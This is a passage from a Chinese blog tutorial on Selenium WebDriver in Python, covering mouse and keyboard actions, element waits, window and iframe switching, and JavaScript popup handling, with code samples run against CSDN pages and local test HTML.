class="hljs-number">2</span>)<span class="hljs-comment"># 定位搜索输入框</span>text_label = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;toolbar-search-input&quot;]&#x27;</span>)<span class="hljs-comment"># 在搜索框中输入 Dream丶Killer</span>text_label.send_keys(<span class="hljs-string">&#x27;Dream丶Killer&#x27;</span>)sleep(<span class="hljs-number">2</span>)<span class="hljs-comment"># 清除搜索框中的内容</span>text_label.clear()<span class="hljs-comment"># 输出搜索框元素是否可见</span><span class="hljs-built_in">print</span>(text_label.is_displayed())<span class="hljs-comment"># 输出placeholder的值</span><span class="hljs-built_in">print</span>(text_label.get_attribute(<span class="hljs-string">&#x27;placeholder&#x27;</span>))<span class="hljs-comment"># 定位搜索按钮</span>button = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;toolbar-search-button&quot;]/span&#x27;</span>)<span class="hljs-comment"># 输出按钮的大小</span><span class="hljs-built_in">print</span>(button.size)<span class="hljs-comment"># 输出按钮上的文本</span><span class="hljs-built_in">print</span>(button.text)<span class="hljs-string">&#x27;&#x27;&#x27;输出内容</span><span class="hljs-string">True</span><span class="hljs-string">python面试100问</span><span class="hljs-string">&#123;&#x27;height&#x27;: 32, &#x27;width&#x27;: 28&#125;</span><span class="hljs-string">搜索</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre></div><hr><h2 id="鼠标控制"><a href="#鼠标控制" class="headerlink" title="鼠标控制"></a><font color="orange">鼠标控制</font></h2><p>在webdriver 中，鼠标操作都封装在ActionChains类中，常见方法如下：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>click()</td><td>单击左键</td></tr><tr><td>context_click()</td><td>单击右键</td></tr><tr><td>double_click()</td><td>双击</td></tr><tr><td>drag_and_drop()</td><td>拖动</td></tr><tr><td>move_to_element()</td><td>鼠标悬停</td></tr><tr><td>perform()</td><td>执行所有ActionChains中存储的动作</td></tr></tbody></table>### 单击左键<p>模拟完成单击鼠标左键的操作，一般点击进入子页面等会用到，左键不需要用到 <code>ActionChains</code> 。</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># 定位搜索按钮</span><span class="hljs-attribute">button</span> = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[<span class="hljs-variable">@id</span>=&quot;toolbar-search-button&quot;]/span&#x27;</span>)<span class="hljs-comment"># 执行单击操作</span>button.click()</code></pre></div><h3 id="单击右键"><a href="#单击右键" class="headerlink" title="单击右键"></a>单击右键</h3><p>鼠标右击的操作与左击有很大不同，需要使用 <code>ActionChains</code> 。</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium.webdriver.common.action_chains <span class="hljs-keyword">import</span> ActionChains# 定位搜索按钮button = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;toolbar-search-button&quot;]/span&#x27;</span>)# 右键搜索按钮ActionChains(driver).context_click(button).<span class="hljs-keyword">perform</span>()</code></pre></div><h3 id="双击"><a href="#双击" class="headerlink" title="双击"></a>双击</h3><p>模拟鼠标双击操作。</p><div class="code-wrapper"><pre><code class="hljs pgsql"># 定位搜索按钮button = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;toolbar-search-button&quot;]/span&#x27;</span>)# 执行双击动作ActionChains(driver).double_click(button).<span class="hljs-keyword">perform</span>()</code></pre></div><h3 id="拖动"><a href="#拖动" class="headerlink" title="拖动"></a>拖动</h3><p>模拟鼠标拖动操作，该操作有两个必要参数，</p><div class="code-wrapper"><pre><code class="hljs pgsql"># 定位要拖动的元素source = driver.find_element_by_xpath(<span class="hljs-string">&#x27;xxx&#x27;</span>)# 定位目标元素target = driver.find_element_by_xpath(<span class="hljs-string">&#x27;xxx&#x27;</span>)# 执行拖动动作ActionChains(driver).drag_and_drop(source, target).<span class="hljs-keyword">perform</span>()</code></pre></div><h3 id="鼠标悬停"><a href="#鼠标悬停" class="headerlink" title="鼠标悬停"></a>鼠标悬停</h3><p>模拟悬停的作用一般是为了显示隐藏的下拉框，比如 CSDN 主页的收藏栏，我们看一下效果。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/71d37932ab2d47bba151e29a6ab470d1.png"></p><div class="code-wrapper"><pre><code class="hljs pgsql"># 定位收藏栏collect  = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;csdn-toolbar&quot;]/div/div/div[3]/div/div[3]/a&#x27;</span>)# 悬停至收藏标签处ActionChains(driver).move_to_element(collect).<span class="hljs-keyword">perform</span>()</code></pre></div><hr><h2 id="键盘控制"><a href="#键盘控制" class="headerlink" title="键盘控制"></a><font color="orange">键盘控制</font></h2><p><code>webdriver</code> 中 <code>Keys</code> 类几乎提供了键盘上的所有按键方法，我们可以使用 <code>send_keys + Keys</code> 实现输出键盘上的组合按键如 <strong>“Ctrl + C”、“Ctrl + V”</strong> 等。</p><div class="code-wrapper"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> selenium.webdriver.<span class="hljs-keyword">common</span>.keys import Keys<span class="hljs-meta"># 定位输入框并输入文本</span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(<span class="hljs-string">&#x27;Dream丶killer&#x27;</span>)<span class="hljs-meta"># 模拟回车键进行跳转（输入内容后） </span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(Keys.ENTER)<span class="hljs-meta"># 使用 Backspace 来删除一个字符</span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(Keys.BACK_SPACE)<span class="hljs-meta"># Ctrl + A 全选输入框中内容</span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(Keys.CONTROL, <span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-meta"># Ctrl + C 复制输入框中内容</span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(Keys.CONTROL, <span class="hljs-string">&#x27;c&#x27;</span>)<span class="hljs-meta"># Ctrl + V 粘贴输入框中内容</span>driver.find_element_by_id(<span class="hljs-string">&#x27;xxx&#x27;</span>).send_keys(Keys.CONTROL, <span class="hljs-string">&#x27;v&#x27;</span>)</code></pre></div><p>其他常见键盘操作：</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Keys.F1</td><td align="center">F1键</td></tr><tr><td align="center">Keys.SPACE</td><td align="center">空格</td></tr><tr><td align="center">Keys.TAB</td><td align="center">Tab键</td></tr><tr><td align="center">Keys.ESCAPE</td><td align="center">ESC键</td></tr><tr><td align="center">Keys.ALT</td><td align="center">Alt键</td></tr><tr><td align="center">Keys.SHIFT</td><td align="center">Shift键</td></tr><tr><td align="center">Keys.ARROW_DOWN</td><td align="center">向下箭头</td></tr><tr><td align="center">Keys.ARROW_LEFT</td><td align="center">向左箭头</td></tr><tr><td align="center">Keys.ARROW_RIGHT</td><td align="center">向右箭头</td></tr><tr><td align="center">Keys.ARROW_UP</td><td align="center">向上箭头</td></tr></tbody></table><hr><h2 id="设置元素等待"><a href="#设置元素等待" class="headerlink" title="设置元素等待"></a><font color="orange">设置元素等待</font></h2><p>很多页面都使用 <code>ajax</code> 技术，页面的元素不是同时被加载出来的，为了防止定位这些尚在加载的元素报错，可以设置元素等来增加脚本的稳定性。<code>webdriver</code> 中的等待分为 显式等待 和 隐式等待。</p><h3 id="显式等待"><a href="#显式等待" class="headerlink" title="显式等待"></a>显式等待</h3><p>显式等待：设置一个超时时间，每个一段时间就去检测一次该元素是否存在，如果存在则执行后续内容，如果超过最大时间（超时时间）则抛出超时异常（<code>TimeoutException</code>）。显示等待需要使用 <code>WebDriverWait</code>，同时配合 <code>until</code> 或 <code>not until</code> 。下面详细讲解一下。</p><blockquote></blockquote><p>WebDriverWait(driver, timeout, poll_frequency&#x3D;0.5, ignored_exceptions&#x3D;None)</p><blockquote></blockquote><p>until(method, message&#x3D;’ ‘)<br/> until_not(method, message&#x3D;’ ‘)</p><p><code>method</code> 中的预期条件判断方法是由 <code>expected_conditions</code> 提供，下面列举常用方法。</p><p>先定义一个定位器</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium.webdriver.common.<span class="hljs-keyword">by</span> <span class="hljs-keyword">import</span> <span class="hljs-keyword">By</span><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriverdriver = webdriver.Chrome()locator = (<span class="hljs-keyword">By</span>.ID, <span class="hljs-string">&#x27;kw&#x27;</span>)element = driver.find_element_by_id(<span class="hljs-string">&#x27;kw&#x27;</span>)</code></pre></div><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">title_is(‘百度一下’)</td><td align="left">判断当前页面的 title 是否等于预期</td></tr><tr><td align="left">title_contains(‘百度’)</td><td align="left">判断当前页面的 title 是否包含预期字符串</td></tr><tr><td align="left">presence_of_element_located(locator)</td><td align="left">判断元素是否被加到了 dom 树里，并不代表该元素一定可见</td></tr><tr><td align="left">visibility_of_element_located(locator)</td><td align="left">判断元素是否可见，可见代表元素非隐藏，并且元素的宽和高都不等于0</td></tr><tr><td align="left">visibility_of(element)</td><td align="left">跟上一个方法作用相同，但传入参数为 element</td></tr><tr><td align="left">text_to_be_present_in_element(locator , ‘百度’)</td><td align="left">判断元素中的 text 是否包含了预期的字符串</td></tr><tr><td align="left">text_to_be_present_in_element_value(locator , ‘某值’)</td><td align="left">判断元素中的 value 属性是否包含了预期的字符串</td></tr><tr><td align="left">frame_to_be_available_and_switch_to_it(locator)</td><td align="left">判断该 frame 是否可以 switch 进去，True 则 switch 进去，反之 False</td></tr><tr><td align="left">invisibility_of_element_located(locator)</td><td align="left">判断元素中是否不存在于 dom 树或不可见</td></tr><tr><td align="left">element_to_be_clickable(locator)</td><td align="left">判断元素中是否可见并且是可点击的</td></tr><tr><td align="left">staleness_of(element)</td><td align="left">等待元素从 dom 树中移除</td></tr><tr><td align="left">element_to_be_selected(element)</td><td align="left">判断元素是否被选中,一般用在下拉列表</td></tr><tr><td align="left">element_selection_state_to_be(element, True)</td><td align="left">判断元素的选中状态是否符合预期，参数 element，第二个参数为 True/False</td></tr><tr><td align="left">element_located_selection_state_to_be(locator, True)</td><td align="left">跟上一个方法作用相同，但传入参数为 locator</td></tr><tr><td align="left">alert_is_present()</td><td align="left">判断页面上是否存在 alert</td></tr></tbody></table><p>下面写一个简单的例子，这里定位一个页面不存在的元素，抛出的异常信息正是我们指定的内容。</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait<span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<span class="hljs-keyword">from</span> selenium.webdriver.common.<span class="hljs-keyword">by</span> <span class="hljs-keyword">import</span> <span class="hljs-keyword">By</span>driver = webdriver.Chrome()element = WebDriverWait(driver, <span class="hljs-number">5</span>, <span class="hljs-number">0.5</span>).<span class="hljs-keyword">until</span>(            EC.presence_of_element_located((<span class="hljs-keyword">By</span>.ID, <span class="hljs-string">&#x27;kw&#x27;</span>)),                                           message=<span class="hljs-string">&#x27;超时啦!&#x27;</span>)</code></pre></div><h3 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h3><p>隐式等待也是指定一个超时时间，如果超出这个时间指定元素还没有被加载出来，就会抛出 <code>NoSuchElementException</code> 异常。<br/> 除了抛出的异常不同外，还有一点，<font color="#33CCCC">隐式等待是全局性的，即运行过程中，如果元素可以定位到，它不会影响代码运行，但如果定位不到，则它会以轮询的方式不断地访问元素直到元素被找到，若超过指定时间，则抛出异常</font>。</p><p>使用 <code>implicitly_wait()</code> 来实现隐式等待，使用难度相对于显式等待要简单很多。<br/> 示例：打开个人主页，设置一个隐式等待时间 5s，通过 <code>id</code> 定位一个不存在的元素，最后打印 抛出的异常 与 运行时间。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> timedriver = webdriver.Chrome()driver.get(<span class="hljs-string">&#x27;https://blog.csdn.net/qq_43965708&#x27;</span>)start = time()driver.implicitly_wait(<span class="hljs-number">5</span>)<span class="hljs-keyword">try</span>:    driver.find_element_by_id(<span class="hljs-string">&#x27;kw&#x27;</span>)<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    <span class="hljs-built_in">print</span>(e)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;耗时：<span class="hljs-subst">&#123;time()-start&#125;</span>&#x27;</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/40344113dfa64b56bf4a7e45fad7de0c.png"><br/> 代码运行到 <code>driver.find_element_by_id(&#39;kw&#39;)</code> 这句之后触发隐式等待，在轮询检查 5s 后仍然没有定位到元素，抛出异常。</p><h3 id="强制等待"><a href="#强制等待" class="headerlink" title="强制等待"></a>强制等待</h3><p>使用 <code>time.sleep()</code> 强制等待，设置固定的休眠时间，对于代码的运行效率会有影响。以上面的例子作为参照，将 隐式等待 改为 强制等待。</p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriverfrom <span class="hljs-selector-tag">time</span> import <span class="hljs-selector-tag">time</span>, sleepdriver = webdriver<span class="hljs-selector-class">.Chrome</span>()driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/qq_43965708&#x27;</span>)start = <span class="hljs-selector-tag">time</span>()<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span>try:    driver<span class="hljs-selector-class">.find_element_by_id</span>(<span class="hljs-string">&#x27;kw&#x27;</span>)except Exception as e:    <span class="hljs-built_in">print</span>(e)    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;耗时：&#123;time()-start&#125;&#x27;</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/efd5951596ec4cf7a7307b544b0f33bb.png"><br/> <font color="red">值得一提的是，对于定位不到元素的时候，从耗时方面隐式等待和强制等待没什么区别。但如果元素经过 2s 后被加载出来，这时隐式等待就会继续执行下面的代码，但 sleep还要继续等待 3s。</font></p><hr><h2 id="定位一组元素"><a href="#定位一组元素" class="headerlink" title="定位一组元素"></a><font color="orange">定位一组元素</font></h2><p>上篇讲述了定位一个元素的 8 种方法，定位一组元素使用的方法只需要将 <code>element</code> 改为 <code>elements</code> 即可，它的使用场景一般是为了批量操作元素。</p><p>这里以 CSDN 首页的一个 博客专家栏 为例。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/05544b7ef0074a5fa4c402d474d50306.png"><br/> 这是专家名称部分的页面代码，不知各位有没有想到如何通过 <code>xpath</code> 定位这一组专家的名称呢？</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver# 设置无头浏览器<span class="hljs-keyword">option</span> = webdriver.ChromeOptions()<span class="hljs-keyword">option</span>.add_argument(<span class="hljs-string">&#x27;--headless&#x27;</span>)driver = webdriver.Chrome(<span class="hljs-keyword">options</span>=<span class="hljs-keyword">option</span>)driver.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/&#x27;</span>)p_list = driver.find_elements_by_xpath(&quot;//p[@class=&#x27;name&#x27;]&quot;)<span class="hljs-type">name</span> = [p.text <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list]<span class="hljs-type">name</span></code></pre></div><hr><h2 id="切换操作"><a href="#切换操作" class="headerlink" title="切换操作"></a><font color="orange">切换操作</font></h2><h3 id="窗口切换"><a href="#窗口切换" class="headerlink" title="窗口切换"></a>窗口切换</h3><p>在 <code>selenium</code> 操作页面的时候，可能会因为点击某个链接而跳转到一个新的页面（打开了一个新标签页），这时候 <code>selenium</code> 实际还是处于上一个页面的，需要我们进行切换才能够定位最新页面上的元素。</p><p>窗口切换需要使用 <code>switch_to.windows()</code> 方法。</p><p>首先我们先看看下面的代码。</p><p>代码流程：先进入 【<strong>CSDN首页</strong>】，保存当前页面的句柄，然后再点击左侧 【<strong>CSDN官方博客</strong>】跳转进入新的标签页，再次保存页面的句柄，我们验证一下 <code>selenium</code> 会不会自动定位到新打开的窗口。<br/><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/025a2c28a7f249679be1b5217f9fb33a.png"></p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriverhandles = []driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/&#x27;</span>)<span class="hljs-comment"># 设置隐式等待</span>driver.implicitly_wait(3)<span class="hljs-comment"># 获取当前窗口的句柄</span>handles.append(driver.current_window_handle)<span class="hljs-comment"># 点击 python，进入分类页面</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;mainContent&quot;]/aside/div[1]/div&#x27;</span>).click()<span class="hljs-comment"># 获取当前窗口的句柄</span>handles.append(driver.current_window_handle)<span class="hljs-built_in">print</span>(handles)<span class="hljs-comment"># 获取当前所有窗口的句柄</span><span class="hljs-built_in">print</span>(driver.window_handles)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/97ccd98881b749b980fa568bedc87620.png"><br/> 可以看到第一个列表 <code>handle</code> 是相同的，说明 <code>selenium</code> 实际操作的还是 CSDN首页 ，并未切换到新页面。<br/> 下面使用 <code>switch_to.windows()</code> 进行切换。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriverhandles = []driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/&#x27;</span>)<span class="hljs-comment"># 设置隐式等待</span>driver.implicitly_wait(3)<span class="hljs-comment"># 获取当前窗口的句柄</span>handles.append(driver.current_window_handle)<span class="hljs-comment"># 点击 python，进入分类页面</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;mainContent&quot;]/aside/div[1]/div&#x27;</span>).click()<span class="hljs-comment"># 切换窗口</span>driver.switch_to.window(driver.window_handles[-1])<span class="hljs-comment"># 获取当前窗口的句柄</span>handles.append(driver.current_window_handle)<span class="hljs-built_in">print</span>(handles)<span class="hljs-built_in">print</span>(driver.window_handles)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/8dbdcafc1fae4f7eacaf11fceb1e1fca.png"><br/> 上面代码在点击跳转后，使用 <code>switch_to</code> 切换窗口，**<code>window_handles</code> 返回的 <code>handle</code> 列表是按照页面出现时间进行排序的**，最新打开的页面肯定是最后一个，这样用 <code>driver.window_handles[-1]</code> + <code>switch_to</code> 即可跳转到最新打开的页面了。</p><p>那如果打开的窗口有多个，如何跳转到之前打开的窗口，如果确实有这个需求，那么打开窗口是就需要记录每一个窗口的 <code>key</code>(别名) 与 <code>value</code>(<code>handle</code>)，保存到字典中，后续根据 <code>key</code> 来取 <code>handle</code> 。</p><h3 id="表单切换"><a href="#表单切换" class="headerlink" title="表单切换"></a>表单切换</h3><p>很多页面也会用带 <code>frame/iframe</code> 表单嵌套，对于这种内嵌的页面 <code>selenium</code> 是无法直接定位的，需要使用 <code>switch_to.frame()</code> 方法将当前操作的对象切换成 <code>frame/iframe</code> 内嵌的页面。</p><p><code>switch_to.frame()</code> 默认可以用的 <code>id</code> 或 <code>name</code> 属性直接定位，但如果 <code>iframe</code> 没有 <code>id</code> 或 <code>name</code> ，这时就需要使用 <code>xpath</code> 进行定位。下面先写一个包含 <code>iframe</code> 的页面做测试用。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><span class="language-css">        <span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">p</span> &#123;</span><span class="language-css">            <span class="hljs-attribute">color</span>: #red;</span><span class="language-css">            <span class="hljs-attribute">animation</span>: change <span class="hljs-number">2s</span> infinite;</span><span class="language-css">        &#125;</span><span class="language-css">        <span class="hljs-keyword">@keyframes</span> change &#123;</span><span class="language-css">            <span class="hljs-selector-tag">from</span> &#123;</span><span class="language-css">                <span class="hljs-attribute">color</span>: red;</span><span class="language-css">            &#125;</span><span class="language-css">            <span class="hljs-selector-tag">to</span> &#123;</span><span class="language-css">                <span class="hljs-attribute">color</span>: blue;</span><span class="language-css">            &#125;</span><span class="language-css">        &#125;</span><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>公众号：Python新视野<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>CSDN：Dream丶Killer<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>微信：python-sun<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://blog.csdn.net/qq_43965708&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-comment">&lt;!--     &lt;iframe id=&quot;CSDN_info&quot; name=&quot;Dream丶Killer&quot; src=&quot;https://blog.csdn.net/qq_43965708&quot; width=&quot;400&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>现在我们定位红框中的 CSDN 按钮，可以跳转到 CSDN 首页。</p><div class="code-wrapper"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Pathdriver = webdriver.Chrome()# 读取本地html文件driver.get(<span class="hljs-string">&#x27;file:///&#x27;</span> + str(Path(Path.cwd(), <span class="hljs-string">&#x27;iframe测试.html&#x27;</span>)))# <span class="hljs-number">1.</span>通过id定位driver.switch_to.frame(<span class="hljs-string">&#x27;CSDN_info&#x27;</span>)# <span class="hljs-number">2.</span>通过name定位# driver.switch_to.frame(<span class="hljs-string">&#x27;Dream丶Killer&#x27;</span>)# 通过xpath定位# <span class="hljs-number">3.</span>iframe_label = driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/iframe&#x27;</span>)# driver.switch_to.frame(iframe_label)driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;csdn-toolbar&quot;]/div/div/div[1]/div/a/img&#x27;</span>).click()</code></pre></div><p>这里列举了三种定位方式，都可以定位 <code>iframe</code> 。<br/><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/83a5980685d34d1c975072a04a2f2cd3.gif"></p><hr><h2 id="弹窗处理"><a href="#弹窗处理" class="headerlink" title="弹窗处理"></a><font color="orange">弹窗处理</font></h2><p><code>JavaScript</code> 有三种弹窗 <code>alert</code>（确认）、<code>confirm</code>（确认、取消）、<code>prompt</code>（文本框、确认、取消）。</p><p>处理方式：先定位（<code>switch_to.alert</code>自动获取当前弹窗），再使用 <code>text</code>、<code>accept</code>、<code>dismiss</code>、<code>send_keys</code> 等方法进行操作</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">text</td><td align="left">获取弹窗中的文字</td></tr><tr><td align="left">accept</td><td align="left">接受（确认）弹窗内容</td></tr><tr><td align="left">dismiss</td><td align="left">解除（取消）弹窗</td></tr><tr><td align="left">send_keys</td><td align="left">发送文本至警告框</td></tr></tbody></table><p>这里写一个简单的测试页面，其中包含三个按钮，分别对应三个弹窗。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;alert&quot;</span>&gt;</span>alert<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;confirm&quot;</span>&gt;</span>confirm<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;prompt&quot;</span>&gt;</span>prompt<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">        <span class="hljs-keyword">const</span> dom1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;alert&quot;</span>)</span><span class="language-javascript">        dom1.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">           <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;alert hello&quot;</span>)</span><span class="language-javascript">        &#125;)</span><span class="language-javascript"></span><span class="language-javascript">                <span class="hljs-keyword">const</span> dom2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;confirm&quot;</span>)</span><span class="language-javascript">        dom2.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">            <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;confirm hello&quot;</span>)</span><span class="language-javascript">        &#125;)</span><span class="language-javascript"></span><span class="language-javascript">                <span class="hljs-keyword">const</span> dom3 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;prompt&quot;</span>)</span><span class="language-javascript">        dom3.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">            <span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;prompt hello&quot;</span>)</span><span class="language-javascript">        &#125;)</span><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/5396957438ba45c390d979397043c0ba.png"><br/> 下面使用上面的方法进行测试。为了防止弹窗操作过快，每次操作弹窗，都使用 <code>sleep</code> 强制等待一段时间。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleepdriver = 